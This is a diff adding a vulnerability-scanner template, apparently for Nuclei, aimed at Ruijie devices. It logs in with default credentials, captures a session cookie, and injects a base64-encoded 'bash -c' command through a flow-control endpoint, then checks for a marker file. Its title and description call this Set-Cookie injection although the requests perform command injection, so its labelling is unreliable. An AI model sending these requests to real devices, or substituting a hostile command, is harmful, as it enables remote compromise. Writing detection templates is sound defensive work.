@@ -1,0 +1,49 @@
+id: ruijie-setcookie-injection
+
+info:
+  name: Ruijie Set-Cookie Injection
+  author: WhiteRabbitNeo
+  severity: high
+  description: Detects Set-Cookie injection vulnerability in Ruijie devices.
+
+http:
+  - raw:
+      - |
+        POST /ddi/server/login.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        User-Agent: Mozilla/5.0
+
+        username=admin&password=admin?
+      - |
+        POST /flow_control_pi/flwo.control.php?a=getFlowGroup HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Cookie: RUIJIEID={{cookie}};user=admin;
+        User-Agent: Mozilla/5.0
+
+        type=%7Cbash+-c+%27echo+ZWNobyAxMjMgPiAuLi83ODkudHh0+%7C+base64+-d+%7C+bash+%26%26+exit+0%27
+      - |
+        GET /789.txt HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0
+
+    extractors:
+      - type: regex
+        name: cookie
+        part: header
+        group: 1
+        internal: true
+        regex:
+          - "RUIJIEID=(.*); path=/"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "123"
+        part: body
+      - type: status
+        status:
+          - 200
+ 
